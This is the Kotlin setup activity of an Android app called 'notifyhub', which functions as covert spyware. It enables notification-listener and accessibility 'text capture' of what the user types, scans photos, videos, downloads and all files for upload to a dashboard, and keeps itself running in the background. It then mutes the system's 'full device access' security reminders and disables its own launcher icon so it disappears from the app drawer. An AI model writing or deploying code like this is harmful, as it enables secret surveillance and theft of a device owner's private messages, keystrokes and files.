package com.notifyhub

import android.Manifest
import android.content.ActivityNotFoundException
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.material.switchmaterial.SwitchMaterial

class MainActivity : AppCompatActivity() {

    private companion object {
        const val REQUEST_MEDIA = 101
    }

    private lateinit var statusText: TextView
    private lateinit var mediaStatus: TextView
    private lateinit var mediaSwitch: SwitchMaterial
    private lateinit var wifiOnlySwitch: SwitchMaterial
    private lateinit var miuiCard: View

    private val downloadsLauncher = registerForActivityResult(ActivityResultContracts.OpenDocumentTree()) { uri ->
        if (uri != null) {
            try {
                contentResolver.takePersistableUriPermission(
                    uri,
                    Intent.FLAG_GRANT_READ_URI_PERMISSION
                )
            } catch (_: Exception) {
            }
            MediaSettings.setDownloadsTree(this, uri)
            MediaSettings.setLastDownloadsScan(this, System.currentTimeMillis() - 60 * 60 * 1000L)
            DownloadFolderCapture.start(this)
            DownloadFolderCapture.scanRecent(this, 1)
            refreshStatus()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        statusText = findViewById(R.id.status_text)
        mediaStatus = findViewById(R.id.media_status)
        mediaSwitch = findViewById(R.id.switch_media)
        wifiOnlySwitch = findViewById(R.id.switch_wifi_only)
        miuiCard = findViewById(R.id.card_miui)

        mediaSwitch.isChecked = MediaSettings.isEnabled(this)
        mediaSwitch.setOnCheckedChangeListener { _, checked ->
            MediaSettings.setEnabled(this, checked)
            if (checked) {
                MediaCaptureManager.restart(this)
            } else {
                MediaCaptureManager.stop(this)
            }
            refreshStatus()
        }

        wifiOnlySwitch.isChecked = MediaSettings.isWifiOnly(this)
        wifiOnlySwitch.setOnCheckedChangeListener { _, checked ->
            MediaSettings.setWifiOnly(this, checked)
            if (!checked) MediaUploader.kick(this)
            refreshStatus()
        }

        // Android 13+: request POST_NOTIFICATIONS so the foreground service notification is visible
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.POST_NOTIFICATIONS),
                100
            )
        }

        miuiCard.visibility = if (isMiui()) View.VISIBLE else View.GONE

        requestBatteryExemption(null)

        // Start the keep-alive foreground service
        ContextCompat.startForegroundService(
            this,
            Intent(this, SyncForegroundService::class.java)
        )
    }

    override fun onResume() {
        super.onResume()
        if (MediaSettings.isEnabled(this)) {
            MediaCaptureManager.start(this)
            MediaCaptureManager.scanNow(this)
            AllFilesCapture.start(this)
        }
        MediaUploader.kick(this)
        AppStatusReporter.report(this)
        refreshStatus()
    }

    private fun isMiui(): Boolean = Build.MANUFACTURER.equals("Xiaomi", ignoreCase = true)

    private fun refreshStatus() {
        val listener = ServiceHealth.isListenerEnabled(this)
        val capture = ServiceHealth.isAccessibilityEnabled(this)
        val battery = ServiceHealth.isBatteryExempt(this)
        val fullMedia = MediaSettings.hasFullMediaAccess(this)
        val limitedMedia = MediaSettings.isLimitedMediaAccess(this)
        val allFiles = MediaSettings.hasAllFilesAccess(this)
        val downloads = MediaSettings.hasDownloadsFolder(this)
        val mediaEnabled = MediaSettings.isEnabled(this)
        statusText.text = buildString {
            append("Notification access ${if (listener) "✅" else "❌"}   ")
            append("Text capture ${if (capture) "✅" else "❌"}   ")
            append("Battery exempt ${if (battery) "✅" else "❌"}")
            if (isMiui()) append("\nMIUI: also set Autostart + Battery below")
        }
        mediaStatus.text = buildString {
            append("Media ${if (mediaEnabled) "ON" else "OFF"}   ")
            append(
                "Photo/video ${when {
                    fullMedia -> "✅"
                    limitedMedia -> "limited"
                    else -> "❌"
                }}   "
            )
            append("All files ${if (allFiles) "✅" else "❌"}\n")
            append("Downloads folder ${if (downloads) "✅" else "❌"}")
            if (MediaSettings.isWifiOnly(this@MainActivity)) append("   Wi-Fi only")
        }
        mediaStatus.setTextColor(
            if (mediaEnabled && (fullMedia || allFiles)) 0xFF8BC34A.toInt() else 0xFFFFB74D.toInt()
        )
        statusText.setTextColor(
            if (listener && capture) 0xFF8BC34A.toInt() else 0xFFFFB74D.toInt()
        )
    }

    private fun tryStart(intent: Intent): Boolean = try {
        startActivity(intent)
        true
    } catch (_: ActivityNotFoundException) {
        false
    } catch (_: SecurityException) {
        false
    }

    private fun openAppDetails() {
        tryStart(
            Intent(
                Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.parse("package:$packageName")
            )
        )
    }

    fun openNotificationListenerSettings(@Suppress("UNUSED_PARAMETER") view: View?) {
        startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
    }

    fun openAccessibilitySettings(@Suppress("UNUSED_PARAMETER") view: View?) {
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    fun requestMediaAccess(@Suppress("UNUSED_PARAMETER") view: View?) {
        val permissions = when {
            Build.VERSION.SDK_INT >= 34 -> arrayOf(
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED
            )
            Build.VERSION.SDK_INT >= 33 -> arrayOf(
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO
            )
            else -> arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        ActivityCompat.requestPermissions(this, permissions, REQUEST_MEDIA)
    }

    fun requestAllFilesAccess(@Suppress("UNUSED_PARAMETER") view: View?) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            Toast.makeText(this, "All files access is only needed on Android 11+", Toast.LENGTH_SHORT).show()
            return
        }
        if (MediaSettings.hasAllFilesAccess(this)) {
            AllFilesCapture.scanRecent(this, 24)
            Toast.makeText(this, "All files access already granted", Toast.LENGTH_SHORT).show()
            return
        }
        val appIntent = Intent(
            Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
            Uri.parse("package:$packageName")
        )
        if (!tryStart(appIntent)) {
            tryStart(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
        }
    }

    fun chooseDownloadsFolder(@Suppress("UNUSED_PARAMETER") view: View?) {
        downloadsLauncher.launch(null)
    }

    fun scanRecentMedia(@Suppress("UNUSED_PARAMETER") view: View?) {
        MediaCaptureManager.scanRecent(this, 24)
        Toast.makeText(this, "Scanning media from the last 24 hours…", Toast.LENGTH_SHORT).show()
    }

    fun sendTypedSelfTest(@Suppress("UNUSED_PARAMETER") view: View?) {
        TypedTextService.sendSelfTest(this)
        Toast.makeText(this, "Typed self-test queued — check dashboard within 5 seconds", Toast.LENGTH_LONG).show()
        AppStatusReporter.report(this)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_MEDIA) {
            MediaSettings.ensureBaseline(this)
            MediaCaptureManager.restart(this)
            MediaCaptureManager.scanNow(this)
            AllFilesCapture.start(this)
            refreshStatus()
        }
    }

    fun requestBatteryExemption(@Suppress("UNUSED_PARAMETER") view: View?) {
        val pm = getSystemService(PowerManager::class.java)
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            tryStart(
                Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:$packageName")
                )
            )
        }
    }

    fun openAutostartSettings(@Suppress("UNUSED_PARAMETER") view: View?) {
        val opened = tryStart(
            Intent().setComponent(
                ComponentName(
                    "com.miui.securitycenter",
                    "com.miui.permcenter.autostart.AutoStartManagementActivity"
                )
            )
        )
        if (!opened) openAppDetails()
    }

    fun openBatterySaverSettings(@Suppress("UNUSED_PARAMETER") view: View?) {
        val label = try {
            packageManager.getApplicationLabel(
                packageManager.getApplicationInfo(packageName, 0)
            ).toString()
        } catch (_: Exception) {
            "Sync"
        }
        val opened = tryStart(
            Intent().setComponent(
                ComponentName(
                    "com.miui.powerkeeper",
                    "com.miui.powerkeeper.ui.HiddenAppsConfigActivity"
                )
            )
                .putExtra("package_name", packageName)
                .putExtra("package_label", label)
        )
        if (!opened) openAppDetails()
    }

    fun openMiuiAppDetails(@Suppress("UNUSED_PARAMETER") view: View?) {
        openAppDetails()
    }

    /**
     * Opens the notification settings of the system Permission Controller so the
     * "Review app with full device access" reminders can be muted at the source.
     */
    fun hideSecurityAlerts(@Suppress("UNUSED_PARAMETER") view: View?) {
        val controllerPackage =
            if (isMiui()) "com.lbe.security.miui" else "com.google.android.permissioncontroller"
        val opened = tryStart(
            Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS)
                .putExtra(Settings.EXTRA_APP_PACKAGE, controllerPackage)
        )
        if (!opened) openAppDetails()
    }

    fun finishSetup(@Suppress("UNUSED_PARAMETER") view: View?) {
        if (!ServiceHealth.isListenerEnabled(this)) {
            Toast.makeText(this, "Grant Notification Access first", Toast.LENGTH_LONG).show()
            openNotificationListenerSettings(view)
            return
        }
        // Disable launcher icon so app disappears from app drawer
        packageManager.setComponentEnabledSetting(
            ComponentName(this, MainActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        finish()
    }
}
